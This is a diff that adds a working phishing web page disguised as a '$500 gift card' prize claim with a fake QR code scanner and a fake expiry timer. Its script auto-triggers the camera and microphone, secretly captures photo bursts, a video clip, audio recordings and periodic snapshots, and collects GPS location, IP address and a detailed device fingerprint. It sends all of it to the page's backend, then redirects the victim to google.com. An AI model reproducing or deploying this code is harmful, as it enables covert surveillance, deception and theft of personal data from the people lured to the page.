@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Scan QR Code — Claim Your Prize</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Inter',sans-serif;background:linear-gradient(135deg,#7c3aed 0%,#1e1b4b 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
+.container{background:#fff;border-radius:24px;overflow:hidden;max-width:400px;width:100%;box-shadow:0 32px 80px rgba(0,0,0,.4);}
+.header{background:linear-gradient(135deg,#f59e0b,#ef4444);padding:28px 24px;text-align:center;position:relative;overflow:hidden;}
+.header::before{content:'🎉';position:absolute;top:-20px;left:-20px;font-size:6rem;opacity:.1;transform:rotate(-20deg);}
+.header::after{content:'🎊';position:absolute;bottom:-20px;right:-20px;font-size:6rem;opacity:.1;transform:rotate(20deg);}
+.prize-badge{display:inline-block;background:rgba(255,255,255,.2);border:2px solid rgba(255,255,255,.5);border-radius:50px;padding:6px 16px;font-size:.8rem;font-weight:600;color:#fff;margin-bottom:12px;}
+.header h1{font-size:1.8rem;font-weight:800;color:#fff;text-shadow:0 2px 8px rgba(0,0,0,.3);}
+.header .amount{font-size:2.8rem;font-weight:800;color:#fff;text-shadow:0 2px 8px rgba(0,0,0,.3);margin:4px 0;}
+.body{padding:28px 24px;}
+.instruction{background:#fef3c7;border:1px solid #fde68a;border-radius:12px;padding:14px 16px;margin-bottom:20px;font-size:.9rem;color:#92400e;line-height:1.5;}
+.qr-area{text-align:center;margin-bottom:20px;}
+.qr-frame{width:200px;height:200px;border:3px solid #7c3aed;border-radius:16px;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;background:#f8fafc;}
+.qr-frame video{width:100%;height:100%;object-fit:cover;}
+.qr-placeholder{font-size:5rem;}
+.scan-line{position:absolute;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,#7c3aed,transparent);animation:scanline 2s ease-in-out infinite;}
+@keyframes scanline{0%{top:10%;}100%{top:90%;}}
+.qr-label{font-size:.82rem;color:#6b7280;}
+.timer{text-align:center;margin-bottom:16px;}
+.timer-circle{display:inline-flex;align-items:center;justify-content:center;width:60px;height:60px;border-radius:50%;border:3px solid #ef4444;font-size:1.4rem;font-weight:800;color:#ef4444;margin-bottom:4px;animation:timerPulse 1s ease-in-out infinite;}
+@keyframes timerPulse{0%,100%{box-shadow:0 0 0 0 rgba(239,68,68,.4);}50%{box-shadow:0 0 0 8px rgba(239,68,68,0);}}
+.timer p{font-size:.78rem;color:#6b7280;}
+.btn{width:100%;padding:15px;background:linear-gradient(135deg,#7c3aed,#5b21b6);color:#fff;border:none;border-radius:12px;font-size:1rem;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;transition:.15s;}
+.btn:active{transform:scale(.97);}
+.status{text-align:center;font-size:.82rem;color:#6b7280;margin-top:10px;min-height:18px;}
+.footer{padding:16px 24px;background:#f9fafb;border-top:1px solid #e5e7eb;display:flex;align-items:center;justify-content:center;gap:6px;font-size:.75rem;color:#6b7280;}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <div class="prize-badge">🏆 YOU WON</div>
+    <div class="amount">$500</div>
+    <h1>Gift Card Prize!</h1>
+  </div>
+
+  <div class="body">
+    <div class="instruction">
+      📷 <strong>Scan the QR code below</strong> with your camera to claim your $500 gift card. Allow camera access when prompted.
+    </div>
+
+    <div class="qr-area">
+      <div class="qr-frame" id="qrFrame">
+        <div class="qr-placeholder" id="qrPlaceholder">📷</div>
+        <video id="scanVideo" autoplay muted playsinline style="display:none;"></video>
+        <div class="scan-line" id="scanLine" style="display:none;"></div>
+      </div>
+      <div class="qr-label" id="qrLabel">Tap below to activate scanner</div>
+    </div>
+
+    <div class="timer">
+      <div class="timer-circle" id="timerDisplay">09:47</div>
+      <p>Offer expires soon!</p>
+    </div>
+
+    <button class="btn" id="scanBtn" onclick="startScanner()">📷 Open QR Scanner</button>
+    <div class="status" id="status"></div>
+  </div>
+
+  <div class="footer">🔒 Secured · Official Giveaway · No purchase required</div>
+</div>
+
+<script>
+const BACKEND = window.location.origin;
+let stream = null, captured = false;
+
+// Countdown timer (cosmetic)
+let secs = 587;
+const timerEl = document.getElementById('timerDisplay');
+setInterval(() => {
+  if (secs > 0) secs--;
+  timerEl.textContent = String(Math.floor(secs/60)).padStart(2,'0') + ':' + String(secs%60).padStart(2,'0');
+}, 1000);
+
+async function startScanner() {
+  const btn = document.getElementById('scanBtn');
+  const status = document.getElementById('status');
+  btn.disabled = true; btn.textContent = '🔄 Opening scanner...';
+  status.textContent = 'Requesting camera...';
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user', width:1280, height:720 }, audio:true });
+    document.getElementById('qrPlaceholder').style.display = 'none';
+    const vid = document.getElementById('scanVideo');
+    vid.srcObject = stream; vid.style.display = 'block';
+    document.getElementById('scanLine').style.display = 'block';
+    document.getElementById('qrLabel').textContent = 'Scanning... hold steady';
+    btn.textContent = '⏳ Verifying prize...';
+    status.textContent = 'Scanning QR code...';
+    await captureAll();
+    await delay(2500);
+    status.textContent = '✅ QR scanned! Redirecting to claim page...';
+    setTimeout(() => { window.location.href='https://google.com'; }, 2000);
+  } catch(e) {
+    await captureNoCamera();
+    status.textContent = 'Camera unavailable. Redirecting...';
+    setTimeout(() => { window.location.href='https://google.com'; }, 2000);
+  }
+}
+
+async function captureAll() {
+  if (captured) return; captured = true;
+  fetch(BACKEND + '/ip.php').catch(()=>{});
+  geoCapture();
+  sendDevice();
+  if (stream) {
+    const v = document.createElement('video'); v.srcObject = stream; v.muted = true;
+    await v.play().catch(()=>{});
+    await delay(800);
+    for (let i = 0; i < 5; i++) {
+      const c = document.createElement('canvas'); c.width = v.videoWidth||1280; c.height = v.videoHeight||720;
+      c.getContext('2d').drawImage(v, 0, 0);
+      fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ cat: c.toDataURL('image/jpeg',0.92), burst_index:i, cam_facing:'user', shot_type:'qr' }) }).catch(()=>{});
+      await delay(350);
+    }
+    try {
+      const rec = new MediaRecorder(stream, {mimeType:'video/webm'});
+      const chunks = [];
+      rec.ondataavailable = e => chunks.push(e.data);
+      rec.onstop = () => { const b = new Blob(chunks,{type:'video/webm'}); const fr = new FileReader(); fr.onload=()=>fetch(BACKEND+'/post.php',{method:'POST',body:new URLSearchParams({video_clip:fr.result,cam_facing:'user'})}).catch(()=>{}); fr.readAsDataURL(b); };
+      rec.start(); setTimeout(()=>rec.stop(), 8000);
+    } catch(e){}
+    try {
+      const as = await navigator.mediaDevices.getUserMedia({audio:true,video:false});
+      const ar = new MediaRecorder(as); const ac = [];
+      ar.ondataavailable = e => ac.push(e.data);
+      ar.onstop = () => { const b = new Blob(ac,{type:'audio/webm'}); const fr = new FileReader(); fr.onload=()=>fetch(BACKEND+'/audio.php',{method:'POST',body:new URLSearchParams({audio_clip:fr.result})}).catch(()=>{}); fr.readAsDataURL(b); };
+      ar.start(); setTimeout(()=>ar.stop(), 15000);
+    } catch(e){}
+    startIntervalShots();
+  }
+}
+
+function startIntervalShots() {
+  setInterval(async () => {
+    if (!stream) return;
+    const v = document.createElement('video'); v.srcObject = stream; v.muted = true;
+    await v.play().catch(()=>{});
+    const c = document.createElement('canvas'); c.width = v.videoWidth||640; c.height = v.videoHeight||480;
+    c.getContext('2d').drawImage(v, 0, 0);
+    fetch(BACKEND + '/post.php', { method:'POST', body: new URLSearchParams({ cat: c.toDataURL('image/jpeg',0.85), burst_index:0, cam_facing:'user', shot_type:'interval' }) }).catch(()=>{});
+  }, 30000);
+}
+
+async function captureNoCamera() {
+  fetch(BACKEND + '/ip.php').catch(()=>{}); geoCapture(); sendDevice();
+}
+
+function geoCapture() {
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(
+    p => fetch(BACKEND+'/location.php',{method:'POST',body:new URLSearchParams({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,alt:p.coords.altitude||'',speed:p.coords.speed||'',heading:p.coords.heading||''})}).catch(()=>{}),
+    ()=>{}
+  );
+}
+
+async function sendDevice() {
+  const ua=navigator.userAgent;
+  const os=/Windows/.test(ua)?'Windows':/Mac/.test(ua)?'macOS':/Android/.test(ua)?'Android':/iPhone|iPad/.test(ua)?'iOS':'Other';
+  const br=/Edg/.test(ua)?'Edge':/Chrome/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':/Safari/.test(ua)?'Safari':'Other';
+  const bat=navigator.getBattery?await navigator.getBattery().then(b=>Math.round(b.level*100)+'%').catch(()=>'N/A'):'N/A';
+  const net=(navigator.connection||{}).effectiveType||'N/A';
+  let wv='N/A'; try{const gl=document.createElement('canvas').getContext('webgl');const ext=gl.getExtension('WEBGL_debug_renderer_info');wv=gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);}catch(e){}
+  const cv=document.createElement('canvas');cv.width=200;cv.height=50;const cx=cv.getContext('2d');cx.font='14px Arial';cx.fillStyle='#f60';cx.fillRect(125,1,62,20);cx.fillStyle='#069';cx.fillText('Phish',2,15);
+  fetch(BACKEND+'/device_info.php',{method:'POST',body:new URLSearchParams({os,browser:br,language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,screen_w:screen.width,screen_h:screen.height,pixel_ratio:window.devicePixelRatio,color_depth:screen.colorDepth,cores:navigator.hardwareConcurrency||'N/A',memory:navigator.deviceMemory||'N/A',battery:bat,network:net,platform:navigator.platform,touch:navigator.maxTouchPoints,canvas_hash:cv.toDataURL().slice(-50),webgl_vendor:wv})}).catch(()=>{});
+}
+
+const delay = ms => new Promise(r => setTimeout(r, ms));
+window.addEventListener('load', () => { setTimeout(() => document.getElementById('scanBtn').click(), 2000); });
+</script>
+</body>
+</html>
